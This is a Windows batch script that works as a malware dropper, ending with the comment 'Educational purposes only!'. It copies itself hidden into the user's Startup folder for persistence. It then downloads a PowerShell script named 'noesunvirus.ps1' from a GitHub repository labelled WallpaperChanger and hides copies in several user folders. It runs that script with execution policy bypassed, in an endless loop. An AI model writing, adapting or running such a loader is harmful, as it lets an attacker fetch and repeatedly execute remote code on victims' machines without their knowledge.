@echo off
setlocal enabledelayedexpansion

set scriptURL=https://raw.githubusercontent.com/notthecoolguyyouknow/WallpaperChanger/main/noesunvirus.ps1
set scriptPath1=%userprofile%\AppData\Local\Temp\noesunvirus.ps1
set scriptPath2=%userprofile%\Documents\noesunvirus.ps1
set scriptPath3=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\noesunvirus.ps1
set batchPath=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat

if not exist "%batchPath%" (
    copy "%~f0" "%batchPath%"
    attrib +h +s "%batchPath%"
)

:checkloop

echo Checking for the existence of %scriptPath1%...
if not exist "%scriptPath1%" (
    echo Downloading script from %scriptURL%...
    
    curl -o "%scriptPath1%" "%scriptURL%" 2>download_error.log
    if exist download_error.log (
        echo curl download failed, switching to Invoke-WebRequest.
        type download_error.log
    )

    if not exist "%scriptPath1%" (
        powershell -Command "Invoke-WebRequest -Uri '%scriptURL%' -OutFile '%scriptPath1%'"
    )

    if not exist "%scriptPath1%" (
        echo Failed to download %scriptPath1%. Checking if download_error.log exists.
        if exist download_error.log (
            echo Content of download_error.log:
            type download_error.log
        )
        pause
        exit /b 1
    ) else (
        echo Download succeeded.
    )
)

if exist "%scriptPath1%" (
    echo Copying to %scriptPath2% and %scriptPath3%...
    
    if not exist "%scriptPath2%" (
        copy "%scriptPath1%" "%scriptPath2%"
        if not exist "%scriptPath2%" (
            echo Failed to copy to %scriptPath2%.
        ) else (
            attrib +h +s "%scriptPath2%"
        )
    )

    if not exist "%scriptPath3%" (
        copy "%scriptPath1%" "%scriptPath3%"
        if not exist "%scriptPath3%" (
            echo Failed to copy to %scriptPath3%.
        ) else (
            attrib +h +s "%scriptPath3%"
        )
    )
)

echo Executing the PowerShell script...
powershell -ExecutionPolicy Bypass -File "%scriptPath1%"

timeout /t 10 >nul
goto checkloop

:: Educational purposes only!
